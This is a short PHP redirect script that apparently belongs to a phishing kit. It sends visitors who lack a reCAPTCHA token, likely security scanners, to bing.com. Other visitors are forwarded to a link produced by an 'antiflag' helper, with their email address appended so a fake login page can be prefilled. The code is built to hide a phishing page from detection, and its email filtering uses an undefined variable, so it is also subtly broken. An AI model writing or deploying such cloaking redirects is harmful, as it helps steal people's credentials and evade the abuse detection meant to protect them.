<?php
error_reporting(0);
include ('antiflag.php');

if(!isset($_POST['g-recaptcha-response'])){
    header('Location: https://bing.com/');
    die();
}

$secure_link = flag_remover();

if(!isset($_GET['mail'])){
    header("Location: " .$secure_link);
    die();
}
if(isset($_GET['mail'])){
    $mail_adr = filter_var($data, FILTER_SANITIZE_EMAIL);
    header("Location: " .$secure_link.$mail_adr);
    die();
}

?>